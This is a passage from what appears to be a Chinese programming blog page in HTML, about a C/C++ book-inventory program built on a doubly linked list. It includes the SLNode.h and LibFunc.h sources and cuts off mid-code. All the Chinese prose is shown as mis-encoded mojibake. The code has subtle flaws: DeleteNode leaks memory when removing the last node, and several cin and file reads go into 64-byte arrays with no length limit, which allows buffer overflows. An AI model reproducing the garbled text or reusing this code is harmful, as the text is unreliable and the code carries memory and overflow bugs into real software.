†é‡Œï¼Œå’Œé“¾è¡¨å…³è”èµ·æ¥ï¼Œè¿™æ—¶åº”è¯¥åœ¨å †é‡Œå¼€å‚¨å­˜å­—ç¬¦ä¸²æ°å¥½éœ€è¦çš„ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯<code>sizeof(char) * (strLen + 1)</code></p><p>ç„¶åå°±æ˜¯å½“é“¾è¡¨é‡Œæœ‰è¿™æ ·é¢å¤–åˆ†é…çš„ç©ºé—´çš„æ—¶å€™ä¸€å®šè¦è®°å¾—åœ¨åˆ é™¤nodeçš„æ—¶å€™é‡Šæ”¾æ‰è¿™äº›ç©ºé—´ï¼Œ<code>malloc</code>å’Œ<code>free</code>ä¸€å®šè¦å¹³è¡¡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(SLNode head, ... , <span class="keyword">char</span> *name, <span class="keyword">char</span> *author)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    t-&gt;nameLen = <span class="built_in">strlen</span>(name);</span><br><span class="line">    t-&gt;authorLen = <span class="built_in">strlen</span>(author);</span><br><span class="line">    <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// æ­¤å¤„ å­—ç¬¦ä¸²é•¿åº¦+1 çš„åŸå› æ˜¯ç»“å°¾çš„&#x27;\0&#x27;å¾—ç®—è¿›å»</span></span><br><span class="line">    t-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">    t-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;name, name, nameSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;author, author, authorSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><p>å’ŒLinuxçš„pipeçš„æ¦‚å¿µåŸºæœ¬ä¸€æ ·ï¼Ÿåæ­£è¦ä»æ–‡ä»¶è¾“å…¥è¾“å‡ºçš„è¯å°±åƒä¸‹é¢è¿™æ ·åšå°±å¥½äº†ï¼ŒACMäººåº”è¯¥æŒºç†Ÿçš„ï¼Ÿ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freopen(<span class="string">&quot;input.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="built_in">stdin</span>);</span><br><span class="line">freopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        SLNode.h    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> amount, nameLen, authorLen;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> *name, *author;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">last</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; * SLNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Initiate</span><span class="params">(SLNode *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *head = (SLNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    (*head)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    (*head)-&gt;last = <span class="literal">NULL</span>;</span><br><span class="line">    (*head)-&gt;amount = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">SLNode <span class="title">GetNode</span><span class="params">(SLNode head, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; head-&gt;amount || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;# ERROR: Getting index out of range, index = %d &gt; %d\n&quot;</span>, index, head-&gt;amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SLNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (index-- != <span class="number">0</span>)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(SLNode head, <span class="keyword">int</span> index, <span class="keyword">int</span> amount, <span class="keyword">float</span> price, <span class="keyword">char</span> *name, <span class="keyword">char</span> *author)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; head-&gt;amount + <span class="number">1</span> || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;# ERROR: Inserting index out of range, index = %d\n&quot;</span>, index);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;amount++;</span><br><span class="line">    SLNode t, p;</span><br><span class="line">    t = (SLNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    p = GetNode(head, index - <span class="number">1</span>);</span><br><span class="line">    t-&gt;next = p-&gt;next;</span><br><span class="line">    t-&gt;last = p;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        (p-&gt;next)-&gt;last = t;</span><br><span class="line">    p-&gt;next = t;</span><br><span class="line">    t-&gt;amount = amount;</span><br><span class="line">    t-&gt;price = price;</span><br><span class="line">    t-&gt;nameLen = <span class="built_in">strlen</span>(name);</span><br><span class="line">    t-&gt;authorLen = <span class="built_in">strlen</span>(author);</span><br><span class="line">    <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">    t-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">    t-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;name, name, nameSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;author, author, authorSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(SLNode head, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SLNode p = GetNode(head, index);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    head-&gt;amount--;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        (p-&gt;last)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        (p-&gt;last)-&gt;next = p-&gt;next;</span><br><span class="line">        (p-&gt;next)-&gt;last = p-&gt;last;</span><br><span class="line">        <span class="built_in">free</span>(p-&gt;name);</span><br><span class="line">        <span class="built_in">free</span>(p-&gt;author);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        LibFunc.h    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;SLNode.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">SLNode head;</span><br><span class="line"><span class="keyword">bool</span> inputFromFile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AlertWrongInput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# ERROR: Wrong input&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintInfoTitle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- | index |  amt  |  price  |&quot;</span> &lt;&lt; setw(<span class="number">17</span>) &lt;&lt; <span class="string">&quot;name&quot;</span> &lt;&lt; setw(<span class="number">13</span>) &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; setw(<span class="number">18</span>) &lt;&lt; <span class="string">&quot;author&quot;</span> &lt;&lt; setw(<span class="number">12</span>) &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintInfo</span><span class="params">(<span class="keyword">int</span> i, SLNode p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- | &quot;</span> &lt;&lt; setw(<span class="number">5</span>) &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">5</span>) &lt;&lt; p-&gt;amount &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">7</span>) &lt;&lt; p-&gt;price &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">15</span> + p-&gt;nameLen / <span class="number">2</span>) &lt;&lt; p-&gt;name &lt;&lt; setw(<span class="number">15</span> - p-&gt;nameLen / <span class="number">2</span>) &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">15</span> + p-&gt;authorLen / <span class="number">2</span>) &lt;&lt; p-&gt;author &lt;&lt; setw(<span class="number">15</span> - p-&gt;authorLen / <span class="number">2</span>) &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SaveData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ofstream <span class="title">f</span><span class="params">(<span class="string">&quot;data.txt&quot;</span>, ios::trunc)</span></span>;</span><br><span class="line">    f &lt;&lt; head-&gt;amount &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    SLNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f &lt;&lt; setw(<span class="number">5</span>) &lt;&lt; p-&gt;amount &lt;&lt; setw(<span class="number">7</span>) &lt;&lt; p-&gt;price &lt;&lt; setw(<span class="number">32</span>) &lt;&lt; p-&gt;name &lt;&lt; setw(<span class="number">32</span>) &lt;&lt; p-&gt;author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    f.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">f</span><span class="params">(<span class="string">&quot;data.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!f.is_open())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# WARNING: No pre data&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num, amt;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>], author[<span class="number">64</span>];</span><br><span class="line">    f &gt;&gt; num;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f &gt;&gt; amt;</span><br><span class="line">        f &gt;&gt; price;</span><br><span class="line">        f &gt;&gt; name;</span><br><span class="line">        f &gt;&gt; author;</span><br><span class="line">        Insert(head, i + <span class="number">1</span>, amt, price, name, author);</span><br><span class="line">    &#125;</span><br><span class="line">    f.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddNewBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Adding New Book&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> amount;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>], author[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input amount : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; amount;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; amount &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input price  : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; price;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; price &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input name   : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input author : &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; author;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Insert(head, head-&gt;amount + <span class="number">1</span>, amount, price, name, author);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ViewAllBooks</span><span class="params">(<span class="keyword">int</span> notice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (notice)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Viewing All Books&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PrintInfoTitle();</span><br><span class="line">    SLNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; head-&gt;amount &amp;&amp; p != <span class="literal">NULL</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PrintInfo(i, p);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Editing Info&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ViewAllBooks(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Edit book info at index of : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; index &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    SLNode p = GetNode(head, index);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> input;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- 1.amount  2.price  3.name  4.author  5.done&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input selection : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> newAmt;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new amount : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newAmt;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newAmt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            p-&gt;amount = newAmt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">float</span> newPrice;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new price : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newPrice;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newPrice &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            p-&gt;price = newPrice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> newName[<span class="number">64</span>];</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new name : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newName;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newName &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">free</span>(p-&gt;name);</span><br><span class="line">            p-&gt;nameLen = <span class="built_in">strlen</span>(newName);</span><br><span class="line">            <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (p-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">            p-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">            <span 